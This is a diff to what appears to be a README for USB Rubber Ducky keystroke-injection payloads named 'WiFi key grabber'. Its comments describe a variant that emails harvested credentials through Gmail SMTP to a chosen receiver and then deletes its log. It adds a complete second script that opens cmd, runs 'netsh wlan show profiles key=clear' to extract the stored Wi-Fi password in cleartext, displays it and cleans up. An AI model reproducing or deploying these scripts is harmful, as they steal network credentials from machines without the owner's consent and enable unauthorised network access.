@@ -12,13 +12,14 @@
 * Windows 7, requires UAC
 
 ## **Code**;
+* Gmail version;
 ```
 REM Title: WiFi key grabber
 REM Author: SiemH
 REM Version: 7
 REM Description: 
 REM 20 sec payload that finds the SSID, Network type, 
-REM Authentication type and the network key, saves those to 'log' 
+REM Authentication type and network key, saves those to 'log' 
 REM and creates an SMTP server and emails the contents of 'log'
 REM using the specified Gmail account to the specified receiver.
 
@@ -97,6 +98,53 @@ DELAY 500
 REM FASE 4: Final cleanup
 REM --> Delete log and exit
 STRING del log & exit
+ENTER
+```
+
+* 'Echo' version;
+```
+REM Title: WiFi key grabber
+REM Author: SiemH
+REM Version: 1
+REM Description: 
+REM 13 sec payload that shows the SSID, Network type, Authentication type and network key.
+
+REM FASE 1: Preparation
+DELAY 3000
+REM --> Minimize all windows
+WINDOWS d
+DELAY 250
+REM --> Open cmd
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 200
+
+REM FASE 2: Information gathering
+REM --> Find the SSID and set 'a'
+STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:"  %a in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set a=%a
+ENTER
+STRING set a="%a:~1%"
+ENTER
+REM --> Get raw info and set 'a'
+STRING netsh wlan show profiles %a% key=clear | findstr /c:"Network type"  /c:" Authentication"  /c:"Key Content"| findstr /v "broadcast"| findstr /v "Radio">>a
+ENTER
+REM --> Find the Network type in the raw info and set 'b'
+STRING for /f "tokens=3 delims=: "  %a in ('findstr "Network type"  a') do set b=%a
+ENTER
+REM --> Find the auth type in the raw info and set 'c'
+STRING for /f "tokens=2 delims=: "  %a in ('findstr " Authentication"  a') do set c=%a
+ENTER
+REM --> Find the key content in the raw info and set 'd'
+STRING for /f "tokens=3 delims=: "  %a in ('findstr "Key Content"  a') do set d=%a
+ENTER
+REM --> Delete raw info / 'a'
+STRING del a
+ENTER
+
+REM FASE 3: Show results and exit
+STRING cls & echo ssid: %a% & echo type: %b% & echo auth: %c% & echo key: %d% & pause & exit
 ENTER
 ```
 
